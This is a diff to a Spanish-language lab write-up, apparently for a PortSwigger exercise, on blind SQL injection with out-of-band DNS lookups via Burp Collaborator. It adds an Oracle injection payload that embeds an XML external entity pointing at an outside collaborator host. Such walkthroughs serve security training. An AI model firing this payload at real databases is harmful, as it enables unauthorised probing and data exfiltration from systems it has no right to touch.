@@ -74,8 +74,8 @@ Si intentas extraer el nombre de una tabla llamada `users`:
 * Exfiltración indirecta: Permite extraer datos incluso si no se muestran directamente en la aplicación.
 
 # Limitaciones
-*Requiere acceso a funciones específicas: Como consultas DNS, HTTP o comandos del sistema operativo, que pueden estar deshabilitadas por configuraciones de seguridad.
-*Visibilidad: Las interacciones de red hacia dominios externos pueden ser detectadas por sistemas de monitoreo (IDS/IPS).
+* Requiere acceso a funciones específicas: Como consultas DNS, HTTP o comandos del sistema operativo, que pueden estar deshabilitadas por configuraciones de seguridad.
+* Visibilidad: Las interacciones de red hacia dominios externos pueden ser detectadas por sistemas de monitoreo (IDS/IPS).
 
 ![logo]({{site.url}}/images/SQLi/sqli-15/logo.png)
 
@@ -87,4 +87,33 @@ Si intentas extraer el nombre de una tabla llamada `users`:
 
 Explotar una vulnerabilidad SQLi y provocar una busqueda DNS.
 
-## Analisis del campo vulnerable
+## Abrir el Burp Collaborator client
+
+Abrimos el `collaborator` de Burp Suite y presionamos en `Copy to clipboard` nos copiara un dato y lo guardamos. Es un `servidor` donde llegaran las consultas.
+
+`c2fsi8n5y9x07iboz6x97z124takybm0.oastify.com`
+
+![Collaborator]({{site.url}}/images/SQLi/sqli-15/collaborator.png)
+
+## Cheat Sheet
+
+[Hoja de Trucos](https://portswigger.net/web-security/sql-injection/cheat-sheet)
+
+![Cheat]({{site.url}}/images/SQLi/sqli-15/cheat.png)
+
+Vamos a probar cada uno de los Payloads que nos proporciona la pagina a ver con que motor esta corriendo.
+
+```sql
+'|| (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://SERVIDOR-COLLABORATOR/"> %remote;]>'),'/l') FROM dual)--
+```
+
+![Payload]({{site.url}}/images/SQLi/sqli-15/payload.png)
+
+Y revisamos la pestaña de `Collaborator` y presionamos `Poll now` para recibir las peticiones. Y vemos que hemos recibido el datos de la consulta.
+
+![Poll]({{site.url}}/images/SQLi/sqli-15/poll.png)
+
+# Aprobado
+
+![Aprobado]({{site.url}}/images/SQLi/sqli-15/aprobado.png)
+
